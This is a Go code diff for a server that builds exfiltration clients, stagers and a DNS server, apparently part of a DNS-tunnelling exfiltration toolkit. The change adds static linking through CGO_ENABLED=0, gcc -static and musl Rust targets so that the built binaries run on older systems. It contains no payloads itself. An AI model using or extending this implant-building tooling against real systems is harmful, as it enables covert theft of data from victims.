@@ -282,6 +282,7 @@ type ClientBuildRequest struct {
 	ExfilJitterMaxMs    int      `json:"exfil_jitter_max_ms"`
 	ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
 	ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
+	StaticLink          bool     `json:"static_link"`
 }
 
 type StagerBuildRequest struct {
@@ -295,6 +296,7 @@ type StagerBuildRequest struct {
 	ChunksPerBurst int    `json:"chunks_per_burst"`
 	BurstPauseMs   int    `json:"burst_pause_ms"`
 	FallbackDNS    string `json:"fallback_dns"`
+	StaticLink     bool   `json:"static_link"`
 }
 
 type ExfilClientBuildRequest struct {
@@ -308,6 +310,7 @@ type ExfilClientBuildRequest struct {
 	BurstPauseMs   int      `json:"burst_pause_ms"`
 	Platform       string   `json:"platform"`
 	Architecture   string   `json:"architecture"`
+	StaticLink     bool     `json:"static_link"`
 }
 
 // Web UI handler for builder page
@@ -621,7 +624,7 @@ func (api *APIServer) executeExfilBuildJob(jobID string, req ExfilClientBuildReq
 		job.Message = "Resolving Rust target toolchain"
 	})
 
-	targetCfg, err := resolveRustTargetConfig(req.Platform, req.Architecture)
+	targetCfg, err := resolveRustTargetConfig(req.Platform, req.Architecture, req.StaticLink)
 	if err != nil {
 		api.failExfilBuildJob(jobID, err)
 		return
@@ -1056,10 +1059,11 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	}
 
 	// Build binary to temp location
+	// CGO_ENABLED=0 produces a fully static binary with no glibc dependency
 	outputPath := filepath.Join(buildDir, "dns-server")
 	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
 	cmd.Dir = buildDir
-	cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
+	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS=linux", "GOARCH=amd64")
 
 	output, err := cmd.CombinedOutput()
 	if err != nil {
@@ -1168,8 +1172,13 @@ func getConfig() Config {
 	}
 
 	// Map architecture - armv7l uses GOARCH=arm with GOARM=7
+	// CGO_ENABLED=0 produces a fully static binary with no glibc dependency
 	goarch := req.Architecture
-	env := append(os.Environ(), fmt.Sprintf("GOOS=%s", goos))
+	cgoEnabled := "1"
+	if req.StaticLink {
+		cgoEnabled = "0" // Disable CGO for static linking
+	}
+	env := append(os.Environ(), fmt.Sprintf("CGO_ENABLED=%s", cgoEnabled), fmt.Sprintf("GOOS=%s", goos))
 	if req.Architecture == "armv7l" {
 		goarch = "arm"
 		env = append(env, "GOARCH=arm", "GOARM=7")
@@ -1341,6 +1350,10 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 	} else {
 		// Linux: Use standard gcc or cross-compiler for ARM
 		args := []string{"-Wall", "-O2", "-s"}
+		if req.StaticLink {
+			// Use -static for glibc-independent binaries that work on older systems
+			args = append(args, "-static")
+		}
 		if archFlag != "" {
 			args = append(args, archFlag)
 		}
@@ -1685,7 +1698,28 @@ type rustTargetConfig struct {
 	requiredHost string
 }
 
-var rustTargetMatrix = map[string]map[string]rustTargetConfig{
+// rustTargetMatrixStatic uses musl for static linking - works on any glibc version
+var rustTargetMatrixStatic = map[string]map[string]rustTargetConfig{
+	"linux": {
+		"amd64":  {platform: "linux", arch: "amd64", triple: "x86_64-unknown-linux-musl"},
+		"x86_64": {platform: "linux", arch: "x86_64", triple: "x86_64-unknown-linux-musl"},
+		"386":    {platform: "linux", arch: "386", triple: "i686-unknown-linux-musl"},
+		"arm64":  {platform: "linux", arch: "arm64", triple: "aarch64-unknown-linux-musl"},
+		"armv7l": {platform: "linux", arch: "armv7l", triple: "armv7-unknown-linux-musleabihf"},
+		"arm":    {platform: "linux", arch: "arm", triple: "arm-unknown-linux-musleabihf"},
+	},
+	"windows": {
+		"amd64":  {platform: "windows", arch: "amd64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
+		"x86_64": {platform: "windows", arch: "x86_64", triple: "x86_64-pc-windows-gnu", linker: "x86_64-w64-mingw32-gcc"},
+		"386":    {platform: "windows", arch: "386", triple: "i686-pc-windows-gnu", linker: "i686-w64-mingw32-gcc"},
+		"arm64":  {platform: "windows", arch: "arm64", triple: "aarch64-pc-windows-msvc", requiredHost: "windows"},
+		"armv7l": {platform: "windows", arch: "armv7l", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
+		"arm":    {platform: "windows", arch: "arm", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
+	},
+}
+
+// rustTargetMatrixDynamic uses glibc for dynamic linking - smaller binaries but requires compatible glibc
+var rustTargetMatrixDynamic = map[string]map[string]rustTargetConfig{
 	"linux": {
 		"amd64":  {platform: "linux", arch: "amd64"},
 		"x86_64": {platform: "linux", arch: "x86_64"},
@@ -1704,10 +1738,19 @@ var rustTargetMatrix = map[string]map[string]rustTargetConfig{
 	},
 }
 
-func resolveRustTargetConfig(platform, arch string) (rustTargetConfig, error) {
+func resolveRustTargetConfig(platform, arch string, staticLink bool) (rustTargetConfig, error) {
 	platform = strings.ToLower(platform)
 	arch = strings.ToLower(arch)
-	configs, ok := rustTargetMatrix[platform]
+
+	// Select the appropriate target matrix based on static linking preference
+	var targetMatrix map[string]map[string]rustTargetConfig
+	if staticLink {
+		targetMatrix = rustTargetMatrixStatic
+	} else {
+		targetMatrix = rustTargetMatrixDynamic
+	}
+
+	configs, ok := targetMatrix[platform]
 	if !ok {
 		return rustTargetConfig{}, fmt.Errorf("unsupported platform: %s", platform)
 	}
